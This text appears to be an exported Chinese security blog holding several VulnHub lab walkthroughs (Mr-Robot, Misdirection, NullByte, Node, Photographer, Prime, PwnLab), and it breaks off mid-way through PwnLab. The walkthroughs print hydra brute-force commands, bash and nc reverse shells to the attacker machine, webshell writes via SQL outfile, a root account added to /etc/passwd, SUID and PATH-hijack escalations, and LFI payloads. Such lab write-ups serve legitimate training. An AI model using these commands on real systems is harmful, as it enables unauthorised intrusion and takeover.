<h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>这里提权都是比较常见的问题，linpeas可以枚举出很多</p>
<p>另外注意，如果能切换用户，应该仔细检查不同的用户信息</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Mr-Robot-1</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BAMr-Robot-1/</url>
    <content><![CDATA[<h1 id="MrRobot-1"><a href="#MrRobot-1" class="headerlink" title="MrRobot 1"></a>MrRobot 1</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.254</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.254 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.254 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>两个http站点，手动查看<br>页面整的花里胡哨的，查看源代码也没啥信息</p>
<p>目录枚举(.php和.txt)</p>
<p><img src="/images/Mr-Robot-1/2.png" alt="2"></p>
<p>找到了许多许多文件，还发现了wordpress</p>
<p>首先检查常规文件robots.txt</p>
<p><img src="/images/Mr-Robot-1/3.png" alt="3"></p>
<p>发现了两个文件，分别查看</p>
<p>socity.dic是一个很大的字典</p>
<p>key-1-of-3.txt是一个md5字符串</p>
<p><img src="/images/Mr-Robot-1/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>wpscan没有扫到可利用漏洞，尝试爆破wps</p>
<p>这里wps的回显给了很大的提示</p>
<p>用户名错误提示<code>ERROR: Invalid username. Lost your password?</code><br>密码错误提示<code>ERROR: The password you entered for the username Elliot is incorrect. Lost your password?</code></p>
<p>依赖此特性，我们可以枚举当前登录的用户名，并使用它提供的字典<br>但是这字典有点坑，也太大了，我吃完饭回来都没结束，后来发现有好多重复的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat fsocity.dic | sort -u &gt; new.dic</span><br></pre></td></tr></table></figure>

<p>用一个常见的密码(password)进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L new.dic -p password 192.168.1.254 -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;https%3A%2F%2F192.168.1.254%2Fwp-admin%2F&amp;testcookie&#x3D;1:Invalid&quot; -t 64</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/5.png" alt="5"></p>
<p>得到了用户名，再爆破密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L username -P new.dic 192.168.1.254 -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;https%3A%2F%2F192.168.1.254%2Fwp-admin%2F&amp;testcookie&#x3D;1:login_error&quot; -t 64</span><br></pre></td></tr></table></figure>

<p>这里碰到灵异事件了，如果错误语句为error，这里爆破不出来，如果错误语句为login_error，可以爆破出来，哎，我人傻了</p>
<p><img src="/images/Mr-Robot-1/6.png" alt="6"></p>
<p>后台登录wordpress，<code>Elliot/ER28-0652</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&#39;&quot;);</span><br></pre></td></tr></table></figure>

<p>这里很多方法都可以</p>
<p><strong>安装插件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Web-Shells&#x2F;WordPress&#x2F;plugin-shell.php &#x2F;root&#x2F;Desktop</span><br><span class="line">zip plugin-shell.zip plugin-shell.php</span><br><span class="line">访问shell</span><br><span class="line">https:&#x2F;&#x2F;192.168.1.254&#x2F;wp-content&#x2F;plugins&#x2F;plugin-shell&#x2F;plugin-shell.php?cmd&#x3D;id</span><br></pre></td></tr></table></figure>

<p><strong>随便找个能写的插件修改</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;插件名&#x2F;文件名.php</span><br><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;all-in-one-wp-migration&#x2F;all-in-one-wp-migration.php</span><br></pre></td></tr></table></figure>

<p><strong>修改apperance</strong>，比如Twenty Fifteen: 404 Template (404.php)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">访问任意一个不存在的页面都可以</span><br></pre></td></tr></table></figure>

<p>或者修改其他可写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wp-content&#x2F;themes&#x2F;主题&#x2F;文件名.php</span><br><span class="line">https:&#x2F;&#x2F;192.168.1.254&#x2F;wp-content&#x2F;themes&#x2F;twentyfifteen&#x2F;image.php</span><br></pre></td></tr></table></figure>

<p>payload选择</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&#39;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>37292.c提权失败</p>
<p>旧版本nmap SUID提权</p>
<p><img src="/images/Mr-Robot-1/8.png" alt="8"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/9.png" alt="9"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Misdirection 1</title>
    <url>/2020/09/19/%E9%9D%B6%E5%9C%BAMisdirection-1/</url>
    <content><![CDATA[<h1 id="Misdirection-1"><a href="#Misdirection-1" class="headerlink" title="Misdirection 1"></a>Misdirection 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.210</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.210 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.210 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Misdirection-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>对80和8080进行web枚举</p>
<p><img src="/images/Misdirection-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>在8080端口发现了debug目录</p>
<p><img src="/images/Misdirection-1/3.png" alt="3"></p>
<p>直接发现了webshell，直接反弹到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Misdirection-1/4.png" alt="4"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo枚举，发现可以以brexit执行/bin/bash</p>
<p><img src="/images/Misdirection-1/5.png" alt="5"></p>
<p>直接切换过去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u brexit &#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Misdirection-1/6.png" alt="6"></p>
<p>之后进行枚举</p>
<p><img src="/images/Misdirection-1/7.png" alt="7"></p>
<p>发现/etc/passwd对当前用户具有组写入权限，那提权会非常简单，直接写入一个已知密码的0:0用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p><img src="/images/Misdirection-1/8.png" alt="8"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场NullByte</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BANullByte/</url>
    <content><![CDATA[<h1 id="NullByte"><a href="#NullByte" class="headerlink" title="NullByte"></a>NullByte</h1><p>kali:192.168.1.201<br>目标:192.168.1.228</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.228 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.228 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/NullByte/1.png" alt="1"></p>
<p><img src="/images/NullByte/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/NullByte/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索尝试phpmyadmin公开漏洞，但是没找到正确的道路，尝试爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt 192.168.1.228 -f -s 80 http-form-post &quot;&#x2F;phpmyadmin&#x2F;index.php:pma_username&#x3D;^USER^&amp;pma_password&#x3D;^PASS^&amp;server&#x3D;1&amp;target&#x3D;index.php&amp;lang&#x3D;en&amp;collation_connection&#x3D;utf8_general_ci&amp;token&#x3D;9dd398ea38b1c91dc2e57694eb350d3b:Cannot&quot; -t 64 -V</span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/3.png" alt="3"></p>
<p>登录phpmyadmin，尝试写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php&#39; </span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/4.png" alt="4"></p>
<p>权限不足，那尝试写入dirbuster爆出的别的目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;evil.php&#39; </span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/5.png" alt="5"></p>
<p>之后访问</p>
<p><img src="/images/NullByte/6.png" alt="6"></p>
<p>成功执行，那写个一句话过去，反弹shell即可</p>
<p><img src="/images/NullByte/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/NullByte/8.png" alt="8"></p>
<p>首先发现了exim4，我尝试许多针对于它的EDB的本地提权，不过都没有成功<br>查看另一个SUID文件</p>
<p><img src="/images/NullByte/9.png" alt="9"></p>
<p>简单尝试运行，感觉像是执行了ps命令，传送到kali分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x procwatch</span><br><span class="line">ltrace .&#x2F;procwatch</span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/10.png" alt="10"></p>
<p>看来找到了正确的道路</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;ps</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;ps</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;backup&#x2F;procwatch</span><br></pre></td></tr></table></figure>

<p><img src="/images/NullByte/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Node</title>
    <url>/2020/09/26/%E9%9D%B6%E5%9C%BANode/</url>
    <content><![CDATA[<h1 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h1><p>kali:192.168.1.201<br>目标:192.168.1.234</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.234 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.234 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulhubNode/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查页面，目录枚举没有什么发现<br>考虑主机名为node，手动检查网页源代码的js文件，发现了该文件提示了目录</p>
<p><img src="/images/vulhubNode/2.png" alt="2"></p>
<p>去目录检查，发现json数据</p>
<p><img src="/images/vulhubNode/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>破解密码</p>
<p><img src="/images/vulhubNode/4.png" alt="4"></p>
<p>尝试登录</p>
<p><img src="/images/vulhubNode/5.png" alt="5"></p>
<p>登录成功，但是提示只有管理员才能拥有控制台， 考虑枚举之前发现密码哈希的上级目录，这个思路在HTB里遇到过</p>
<p><img src="/images/vulhubNode/6.png" alt="6"></p>
<p>果然多了一个管理员账户，继续密码破解</p>
<p><img src="/images/vulhubNode/7.png" alt="7"></p>
<p>登录成功后会下载一个不知道什么文件</p>
<p><img src="/images/vulhubNode/8.png" alt="8"></p>
<p>查看后发现是base64，解码保存成一个文件，发现是一个zip，而且存在密码，尝试爆破</p>
<p><img src="/images/vulhubNode/9.png" alt="9"></p>
<p>破解成功，进行解压，是网站的web目录</p>
<p>由于该网站使用node.js，根据经验很快去搜寻配置文件<code>app.js</code>，从中发现了凭据</p>
<p><img src="/images/vulhubNode/10.png" alt="10"></p>
<p>尝试ssh</p>
<p><img src="/images/vulhubNode/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>检查发现，tom正在执行某个node.js程序</p>
<p><img src="/images/vulhubNode/12.png" alt="12"></p>
<p>查看代码</p>
<p><img src="/images/vulhubNode/13.png" alt="13"></p>
<p>这个程序不难理解，它使用mark的凭据登录到数据库，从tasks中寻找cmd的值，并且会执行系统命令(exec)然后从数据库中删除，所以写入payload到里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongo -u mark -p 5AYRft73VtFpc84k scheduler</span><br><span class="line">show collections</span><br><span class="line">db.tasks.insert(&#123;&quot;cmd&quot;:&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.201 5555 &gt;&#x2F;tmp&#x2F;f&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/vulhubNode/13.png" alt="13"></p>
<p>之后等待执行，就能获取shell</p>
<p><img src="/images/vulhubNode/14.png" alt="14"></p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.4.0-93-generic</span><br><span class="line">Ubuntu 16.04.3</span><br></pre></td></tr></table></figure>

<p>寻找漏洞</p>
<p><img src="/images/vulhubNode/15.png" alt="15"></p>
<p>44298.c提权</p>
<p><img src="/images/vulhubNode/16.png" alt="16"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Photographer</title>
    <url>/2020/09/07/%E9%9D%B6%E5%9C%BAPhotographer/</url>
    <content><![CDATA[<h1 id="Photographer"><a href="#Photographer" class="headerlink" title="Photographer"></a>Photographer</h1><p>攻击机:192.168.3.3</p>
<p>靶机:192.168.3.2</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/Photographer/1.jpg" alt="1"></p>
<p>发现了两个http服务端口和samba</p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>先对samba进行枚举</p>
<p><img src="/images/Photographer/2.jpg" alt="2"></p>
<p>从中提取出了潜在信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">邮箱域名	photographer.com</span><br><span class="line">发件人		 Agi Clarence</span><br><span class="line">收件人		 Daisa</span><br><span class="line">潜在密码?	mybabygirl</span><br></pre></td></tr></table></figure>

<p>接着访问80和8000端口，并分别进行目录枚举 </p>
<p><img src="/images/Photographer/3.jpg" alt="3"></p>
<p>80端口并没有有价值的发现<br>8000端口发现了目录<code>admin</code>，查看后疑似后台登录页面</p>
<p>另外该页面发现</p>
<p><img src="/images/Photographer/4.jpg" alt="4"></p>
<p>Koken CMS</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞(这里最好跟新一下exploitdb)</p>
<p><img src="/images/Photographer/5.jpg" alt="5"></p>
<p>这是一个后台登录的上传漏洞，需要验证</p>
<p>这个时候我们就要到后台登录页面，尝试后台登录</p>
<p><img src="/images/Photographer/6.jpg" alt="6"></p>
<p>看来用户名是邮箱地址，这里我们可以根据之前的信息，推测出这里的管理员账户应该是<code>daisa@photographer.com</code><br>尝试密码mybabygirl，失败</p>
<p>这里有两个思路，1是尝试爆破配合一般字典，2是针对mybabygirl进行密码变异并爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l daisa@photographer.com -P &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Passwords&#x2F;xato-net-10-million-passwords-1000.txt 192.168.3.2 -s 8000 http-form-post &quot;&#x2F;api.php?&#x2F;sessions:email&#x3D;^USER^&amp;password&#x3D;^PASS^:404&quot; -vV -f</span><br></pre></td></tr></table></figure>

<p><img src="/images/Photographer/7.jpg" alt="7"></p>
<p>运气不错，得到了凭据<code>daisa@photographer.com/babygirl</code></p>
<p>之后就是后台上传getshell，这里没有坑，按照文档上进行操作即可</p>
<p><img src="/images/Photographer/8.jpg" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Linpeas</p>
<p><img src="/images/Photographer/10.jpg" alt="10"></p>
<p>直接SUID即可提权</p>
<p><img src="/images/Photographer/9.jpg" alt="9"></p>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>发现mysql连接文件</p>
<p><img src="/images/Photographer/11.jpg" alt="11"></p>
<p>发现加密hash</p>
<p><img src="/images/Photographer/12.jpg" alt="12"></p>
<p>john破解</p>
<p><img src="/images/Photographer/13.jpg" alt="13"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Prime_Series_Level-1</title>
    <url>/2020/05/31/%E9%9D%B6%E5%9C%BAPrime-Series-Level-1/</url>
    <content><![CDATA[<h1 id="Prime-1"><a href="#Prime-1" class="headerlink" title="Prime: 1"></a>Prime: 1</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.215</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Prime1/1.jpg" alt="1"></p>
<p>只开放了22、80</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>默认页面只有一张图片</p>
<p>使用dirb进行目录枚举</p>
<p><img src="/images/Prime1/2.jpg" alt="2"></p>
<p>发现web应用wordpress</p>
<p><img src="/images/Prime1/3.jpg" alt="3"></p>
<p>既然存在wordpress，就可以使用wpscan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token ..... --url http:&#x2F;&#x2F;192.168.1.215&#x2F;wordpress&#x2F; --enumerate vp</span><br></pre></td></tr></table></figure>

<p><img src="/images/Prime1/5.jpg" alt="5"></p>
<p>发现了22个可能的漏洞，但都对渗透没帮助</p>
<p>之后我继续使用dirb进行更详细的枚举</p>
<p><img src="/images/Prime1/4.jpg" alt="4"></p>
<p>发现了<code>secret.txt</code></p>
<p><img src="/images/Prime1/6.jpg" alt="6"></p>
<p>提示了一个github地址和location.txt</p>
<p>得到了提示</p>
<p><img src="/images/Prime1/7.jpg" alt="7"></p>
<h4 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h4><p>根据提示验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z file,&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt --hc 404 http:&#x2F;&#x2F;192.168.1.215&#x2F;index.php?FUZZ&#x3D;something</span><br></pre></td></tr></table></figure>

<p><img src="/images/Prime1/8.jpg" alt="8"></p>
<p>过滤掉字符长度12</p>
<p><img src="/images/Prime1/9.jpg" alt="9"></p>
<p>fuzz除了关键词file，和提示吻合</p>
<p>使用提示file和location.txt去读取</p>
<p><img src="/images/Prime1/10.jpg" alt="10"></p>
<p>提示在其他php页面使用参数secrettier360</p>
<p>枚举php页面</p>
<p><img src="/images/Prime1/11.jpg" alt="11"></p>
<p>尝试在枚举出的页面使用参数secrettier360</p>
<p>成功在image.php使用参数secrettier360产生LFI</p>
<p><img src="/images/Prime1/12.jpg" alt="12"></p>
<p>在<code>passwd</code>里发现有有用的信息</p>
<p><img src="/images/Prime1/13.jpg" alt="13"></p>
<p>根据提示读取文件</p>
<p><img src="/images/Prime1/14.jpg" alt="14"></p>
<p>成功发现了密码，所以我们现在拥有的账户名+密码进行登录<br>最后使用<code>victor/follow_the_ippsec</code>成功登录wordpress</p>
<p><img src="/images/Prime1/15.jpg" alt="15"></p>
<p>找到了可以上传代码的地方</p>
<p>经尝试只有<code>secret.php</code>拥有W权限，其他都不可以写入</p>
<p><img src="/images/Prime1/16.jpg" alt="16"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="PHP-reverse-shell"><a href="#PHP-reverse-shell" class="headerlink" title="PHP_reverse_shell"></a>PHP_reverse_shell</h3><p>输入我们的<code>PHP_reverse_shell</code>的代码获取shell</p>
<p><img src="/images/Prime1/17.jpg" alt="17"></p>
<p>升级成交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br></pre></td></tr></table></figure>

<p><img src="/images/Prime1/18.jpg" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Prime1/19.jpg" alt="19"></p>
<p>内核提权</p>
<p><img src="/images/Prime1/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场PwnLab</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BAPwnLab/</url>
    <content><![CDATA[<h1 id="PwnLab"><a href="#PwnLab" class="headerlink" title="PwnLab"></a>PwnLab</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.206</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.206 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.206 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>dirbuster</p>
<p><img src="/images/PwnLab/2.png" alt="2"></p>
<p>nikto</p>
<p><img src="/images/PwnLab/3.png" alt="3"></p>
<p>接着开始手动检查</p>
<p>一开始就可以检查到一个显眼的位置，注意观察URL</p>
<p>login</p>
<p><img src="/images/PwnLab/4.png" alt="4"></p>
<p>login.php</p>
<p><img src="/images/PwnLab/6.png" alt="6"></p>
<p>upload</p>
<p><img src="/images/PwnLab/5.png" alt="5"></p>
<p>upload.php</p>
<p><img src="/images/PwnLab/7.png" alt="7"></p>
<p>完全一致</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>通过上述条件可以发现page参数八成是一个LFI漏洞，而且包含位置会添加.php后缀<br>尝试00截断读取passwd失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>尝试php修饰器读取源码</p>
<p>添加<code>php://filter/read=convert.base64-encode/resource=</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.206&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;login</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.206&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure>

<p>接着base64解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat code |base64 -d &gt;upload</span><br><span class="line">cat code2 |base64 -d &gt;login</span><br></pre></td></tr></table></figure>

<p>这样就可以获取源码了</p>
<p>login.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$mysqli &#x3D; new mysqli($server, $username, $password, $database);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;user&#39;]) and isset($_POST[&#39;pass&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	$luser &#x3D; $_POST[&#39;user&#39;];</span><br><span class="line">	$lpass &#x3D; base64_encode($_POST[&#39;pass&#39;]);</span><br><span class="line"></span><br><span class="line">	$stmt &#x3D; $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user&#x3D;? AND pass&#x3D;?&quot;);</span><br><span class="line">	$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);</span><br><span class="line"></span><br><span class="line">	$stmt-&gt;execute();</span><br><span class="line">	$stmt-&gt;store_Result();</span><br><span class="line"></span><br><span class="line">	if ($stmt-&gt;num_rows &#x3D;&#x3D; 1)</span><br><span class="line">	&#123;</span><br><span class="line">		$_SESSION[&#39;user&#39;] &#x3D; $luser;</span><br><span class="line">		header(&#39;Location: ?page&#x3D;upload&#39;);</span><br><span class="line">	